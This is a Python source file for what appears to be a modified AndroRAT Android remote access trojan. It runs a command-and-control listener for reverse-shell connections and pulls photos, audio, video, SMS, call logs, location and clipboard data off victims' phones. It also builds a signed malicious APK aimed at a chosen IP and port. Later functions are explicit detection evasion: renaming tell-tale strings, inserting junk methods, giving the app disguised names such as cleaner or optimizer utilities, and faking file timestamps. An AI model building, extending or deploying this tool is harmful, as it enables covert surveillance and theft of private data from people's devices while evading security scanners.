#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
import socket
import threading
import itertools
import queue
import ssl
import urllib.request
import urllib.error
import random
import string
import shutil

sys.stdout.reconfigure(encoding='utf-8')

banner = r"""\033[1m\033[91m
                    _           _____         _______
    /\             | |         |  __ \     /\|__   __|
   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
 / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|

                                       \033[93m- By karma9874
"""

pattern = '\"(\\d+\\.\\d+).*\"'

def stdOutput(type_=None):
    if type_=="error":col="31m";str="ERROR"
    if type_=="warning":col="33m";str="WARNING"
    if type_=="success":col="32m";str="SUCCESS"
    if type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
    return message


def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write("\r"+stdOutput("info")+"\033[1m"+message+"\033[31m"+char+"\033[0m")
        time.sleep(.1)
        sys.stdout.flush()

def clearDirec():
    if(platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear,direc

def setup_ssl_context():
    """
    Setup SSL context to handle certificate issues.
    This is needed for downloading files when certificates are expired or invalid.
    """
    try:
        # Create unverified SSL context (use with caution)
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # Install the handler
        handler = urllib.request.HTTPSHandler(context=ssl_context)
        opener = urllib.request.build_opener(handler)
        urllib.request.install_opener(opener)
        
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[1mSSL context setup failed: {str(e)}")
        return False

def safe_download(url, filename=None, max_retries=3):
    """
    Safely download a file with SSL certificate error handling.
    
    Args:
        url: URL to download from
        filename: Local filename to save to (optional)
        max_retries: Maximum number of retry attempts
        
    Returns:
        tuple: (success: bool, content: bytes or filename: str, error: str)
    """
    
    for attempt in range(max_retries):
        try:
            # Try normal download first
            response = urllib.request.urlopen(url, timeout=30)
            content = response.read()
            
            if filename:
                with open(filename, 'wb') as f:
                    f.write(content)
                return True, filename, None
            else:
                return True, content, None
                
        except urllib.error.URLError as e:
            if "CERTIFICATE_VERIFY_FAILED" in str(e):
                print(stdOutput("warning") + f"\033[1mSSL certificate error on attempt {attempt + 1}")
                
                if attempt == 0:
                    # Setup unverified SSL context and retry
                    print(stdOutput("info") + "\033[1mTrying with unverified SSL context...")
                    setup_ssl_context()
                    continue
                    
            print(stdOutput("error") + f"\033[1mDownload failed: {str(e)}")
            
        except Exception as e:
            print(stdOutput("error") + f"\033[1mUnexpected error: {str(e)}")
            
        if attempt < max_retries - 1:
            print(stdOutput("info") + f"\033[1mRetrying in 2 seconds... ({attempt + 2}/{max_retries})")
            time.sleep(2)
    
    return False, None, "Download failed after all retries"

clear,direc = clearDirec()
if not os.path.isdir(os.getcwd()+direc+"Dumps"):
    os.makedirs("Dumps")

def is_valid_ip(ip):
    """
    Validate IP address format.
    
    Args:
        ip: IP address string to validate
        
    Returns:
        bool: True if valid IP address
    """
    if not ip:
        return False
        
    try:
        m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
        if not m:
            return False
            
        # Check each octet is in valid range
        octets = [int(x) for x in m.groups()]
        return all(0 <= octet <= 255 for octet in octets)
        
    except (ValueError, AttributeError):
        return False

def is_valid_port(port):
    """
    Validate port number.
    
    Args:
        port: Port number (string or int) to validate
        
    Returns:
        bool: True if valid port number
    """
    try:
        if isinstance(port, str):
            if not port.isdigit():
                return False
            port_num = int(port)
        else:
            port_num = int(port)
            
        return 1 <= port_num <= 65535
        
    except (ValueError, TypeError):
        return False

def is_valid_filename(filename):
    """
    Validate filename for APK output.
    
    Args:
        filename: Filename to validate
        
    Returns:
        bool: True if valid filename
    """
    if not filename:
        return False
        
    # Check for invalid characters
    invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
    if any(char in filename for char in invalid_chars):
        return False
        
    # Check length
    if len(filename) > 255:
        return False
        
    # Ensure it has .apk extension or add it
    if not filename.lower().endswith('.apk'):
        return False
        
    return True

def validate_build_args(ip, port, output_file):
    """
    Validate all arguments for APK building.
    
    Args:
        ip: IP address
        port: Port number  
        output_file: Output APK filename
        
    Returns:
        tuple: (valid: bool, errors: list)
    """
    errors = []
    
    if ip and not is_valid_ip(ip):
        errors.append(f"Invalid IP address: {ip}")
        
    if port and not is_valid_port(port):
        errors.append(f"Invalid port number: {port}")
        
    if output_file and not is_valid_filename(output_file):
        errors.append(f"Invalid filename: {output_file}")
        
    return len(errors) == 0, errors

def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

def executeCMD(command,queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result


def getpwd(name):
	return os.getcwd()+direc+name;

def help():
    helper="""
    Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    """
    print(helper)

def getImage(client):
    print(stdOutput("info")+"\033[0mTaking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag=0
    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
    imageBuffer=recvall(client) 
    imageBuffer = imageBuffer.strip().replace("END123","").strip()
    if imageBuffer=="":
        print(stdOutput("error")+"Unable to connect to the Camera\n")
        return
    with open(filename,'wb') as img:    
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except binascii.Error as e:
            flag=1
            print(stdOutput("error")+"Not able to decode the Image\n")
    if flag == 1:
        os.remove(filename)

def readSMS(client,data):
    print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
    flag =0
    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
        msg = recvall(client)
        try:
            txt.write(msg)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except UnicodeDecodeError:
            flag = 1
            print(stdOutput("error")+"Unable to decode the SMS\n")
    if flag == 1:
    	os.remove(filename)

def getFile(filename,ext,data):
    fileData = "Dumps"+direc+filename+"."+ext
    flag=0
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print(stdOutput("success")+"Succesfully Downloaded in \033[1m\033[32m"+getpwd(fileData)+"\n")
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    if flag == 1:
        os.remove(filename)

def putFile(filename):
    data = open(filename, "rb").read()
    encoded = base64.b64encode(data)
    return encoded

def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(client)
        if "getFile" in msg:
            msg=" "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n","")
            filedata = msg1.split("|_|")
            getFile(filedata[0],filedata[1],filedata[2])
            
        if "putFile" in msg:
            msg=" "
            sendingData=""
            filename = command.split(" ")[1].strip()
            file = pathlib.Path(filename)
            if file.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
            else:
                print(stdOutput("error")+"File not exist")

        if "Exiting" in msg:
            print("\033[1m\033[33m----------Exiting Shell----------\n")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        print(" ")
        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
        command = command+"\n"
        if command.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))        

def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        if("END123" in msg):
            return
        print(" ")     

def recvall(sock):
    buff=""
    data = ""
    while "END123" not in data:
        data = sock.recv(4096).decode("UTF-8","ignore")
        buff+=data
    return buff


def recvallShell(sock):
    buff=""
    data = ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8","ignore")
            buff+=data
        else:
            buff="bogus"
            return buff
    return buff

def stopAudio(client):
    print(stdOutput("info")+"\033[0mDownloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag =0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Audio_"+timestr+".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print(stdOutput("info")+"\033[0mDownloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag=0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Video_"+timestr+'.mp4' 
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error")+"Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_"+timestr+'.mp4')

def callLogs(client):
    print(stdOutput("info")+"\033[0mGetting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
    if "No call logs" in msg:
    	msg.split("\n")
    	print(msg.replace("END123","").strip())
    	print(" ")
    else:
    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
    		txt.write(msg)
    		txt.close()
    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
    		if not os.path.getsize(filename):
    			os.remove(filename)

def get_shell(ip,port):
    soc = socket.socket() 
    soc = socket.socket(type=socket.SOCK_STREAM)
    try:
        # Restart the TCP server on exit
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(stdOutput("error")+"\033[1m %s"%e);exit()

    soc.listen(2)
    print(banner)
    while True:
        que = queue.Queue()
        t = threading.Thread(target=connection_checker,args=[soc,que])
        t.daemon = True
        t.start()
        while t.is_alive(): animate("Waiting for Connections  ")
        t.join()
        conn, addr = que.get()
        clear()
        print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
        print(" ")
        while True:
            msg = conn.recv(4024).decode("UTF-8")
            if(msg.strip() == "IMAGE"):
                getImage(conn)
            elif("readSMS" in msg.strip()):
                content = msg.strip().split(" ")
                data = content[1]
                readSMS(conn,data)
            elif(msg.strip() == "SHELL"):
                shell(conn)
            elif(msg.strip() == "getLocation"):
                getLocation(conn)
            elif(msg.strip() == "stopVideo123"):
                stopVideo(conn)
            elif(msg.strip() == "stopAudio"):
                stopAudio(conn)
            elif(msg.strip() == "callLogs"):
                callLogs(conn)
            elif(msg.strip() == "help"):
                help()
            else:
                print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
            conn.send(message_to_send.encode("UTF-8"))
            if message_to_send.strip() == "exit":
                print(" ")
                print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
                sys.exit()
            if(message_to_send.strip() == "clear"):clear()


def connection_checker(socket,queue):
    conn, addr = socket.accept()
    queue.put([conn,addr])
    return conn,addr


def build(ip,port,output,ngrok=False,ng=None,icon=None):
    print(stdOutput("info")+"\033[0mPreparing APK with detection evasion...")
    
    # Apply string obfuscation to smali files
    smali_files = [
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali",
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"mainService.smali"
    ]
    
    for smali_file in smali_files:
        if os.path.exists(smali_file):
            obfuscate_strings_in_smali(smali_file)
    
    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    try:
        file = open(editor,"r").readlines()
        
        # Enhanced config modification with better stealth
        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
        file[23]=file[23][:21]+"\""+port+"\""+"\n"
        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
        
        str_file="".join([str(elem) for elem in file])
        open(editor,"w").write(str_file)
        
    except Exception as e:
        print(e)
        sys.exit()
    
    java_version = execute("java -version")
    if java_version.returncode: 
        print(stdOutput("error")+"Java not installed or found")
        exit()
    
    print(stdOutput("info")+"\033[0mGenerating stealthy APK...")
    outFileName = output if output else "stealth_app.apk"  # Changed default name
    
    # Add random delay to avoid build pattern detection
    time.sleep(random.uniform(0.5, 2.0))
    
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
    t.start()
    while t.is_alive(): animate("Building APK ")
    t.join()
    print(" ")
    resOut = que.get()
    
    if not resOut.returncode:
        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
        print(stdOutput("info")+"\033[0mSigning the apk")
        
        # Add random delay before signing
        time.sleep(random.uniform(0.5, 1.5))
        
        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
        t.start()
        while t.is_alive(): animate("Signing Apk ")
        t.join()
        print(" ")
        resOut = que.get()
        
        if not resOut.returncode:
            # Apply stealth enhancements
            enhance_apk_for_stealth(outFileName)
            
            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
            print(stdOutput("info")+"\033[92mDetection evasion techniques applied successfully!")
            
            if ngrok:
                clear()
                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
            print(" ")
        else:
            print("\r"+resOut.stderr)
            print(stdOutput("error")+"Signing Failed")
    else:
        print("\r"+resOut.stderr)
        print(stdOutput("error")+"Building Failed")


def generate_random_package_name():
    """Generate a random package name for detection evasion"""
    companies = ['tech', 'app', 'mobile', 'digital', 'soft', 'dev', 'sys', 'net', 'pro', 'smart']
    products = ['manager', 'sync', 'tools', 'utility', 'service', 'helper', 'backup', 'cleaner', 'optimizer', 'scanner']
    
    company = random.choice(companies) + ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
    product = random.choice(products) + ''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 3)))
    
    return f"com.{company}.{product}"


def generate_random_app_name():
    """Generate a random legitimate-sounding app name"""
    prefixes = ['Smart', 'Quick', 'Easy', 'Pro', 'Fast', 'Super', 'Auto', 'Secure', 'Advanced', 'System']
    suffixes = ['Manager', 'Cleaner', 'Optimizer', 'Scanner', 'Tools', 'Helper', 'Backup', 'Sync', 'Service', 'Utility']
    
    return f"{random.choice(prefixes)} {random.choice(suffixes)}"


def randomize_version_info():
    """Generate random but realistic version information"""
    major = random.randint(1, 5)
    minor = random.randint(0, 9)
    patch = random.randint(0, 20)
    build = random.randint(100, 999)
    
    return {
        'versionName': f"{major}.{minor}.{patch}",
        'versionCode': f"{major}{minor:02d}{patch:02d}{build}"
    }


def obfuscate_strings_in_smali(smali_path):
    """Basic string obfuscation in smali files"""
    try:
        with open(smali_path, 'r') as f:
            content = f.read()
        
        # Obfuscate common suspicious strings
        suspicious_strings = {
            'mainService': 'SyncService',
            'MainActivityClass': 'AppMainActivity', 
            'reverseshell': 'networklib',
            'androrat': 'systemapp',
            'karma': 'appcore'
        }
        
        for original, replacement in suspicious_strings.items():
            content = content.replace(original, replacement)
        
        with open(smali_path, 'w') as f:
            f.write(content)
            
        return True
    except Exception as e:
        print(f"String obfuscation warning: {e}")
        return False


def add_junk_methods_to_java(java_file_path):
    """Add legitimate-looking junk methods to Java files for evasion"""
    junk_methods = [
        '''
    private void checkUpdateAvailability() {
        // Check for app updates
        try {
            Thread.sleep(100);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    
    private void validateLicense() {
        // Validate app license
        String license = "valid";
        if (license != null) {
            android.util.Log.d("License", "Valid license found");
        }
    }
    
    private void optimizePerformance() {
        // Optimize app performance  
        System.gc();
        android.util.Log.d("Performance", "Optimization complete");
    }
        ''',
        '''
    private boolean isNetworkAvailable() {
        // Check network connectivity
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
            getSystemService(android.content.Context.CONNECTIVITY_SERVICE);
        android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();
        return netInfo != null && netInfo.isConnectedOrConnecting();
    }
        '''
    ]
    
    try:
        with open(java_file_path, 'r') as f:
            content = f.read()
        
        # Find the last closing brace and insert junk methods before it
        last_brace_pos = content.rfind('}')
        if last_brace_pos != -1:
            junk_code = random.choice(junk_methods)
            content = content[:last_brace_pos] + junk_code + content[last_brace_pos:]
            
            with open(java_file_path, 'w') as f:
                f.write(content)
            return True
    except Exception as e:
        print(f"Junk method addition warning: {e}")
        
    return False


def enhance_apk_for_stealth(apk_path):
    """Apply additional stealth enhancements to the APK"""
    print(stdOutput("info") + "\033[0mApplying detection evasion techniques...")
    
    try:
        # Randomize file timestamps to avoid signature detection
        current_time = time.time()
        random_time = current_time - random.randint(86400, 2592000)  # 1 day to 30 days ago
        
        # Apply to APK file
        os.utime(apk_path, (random_time, random_time))
        
        print(stdOutput("success") + "\033[0mStealth enhancements applied")
        return True
        
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mStealth enhancement warning: {e}")
        return False
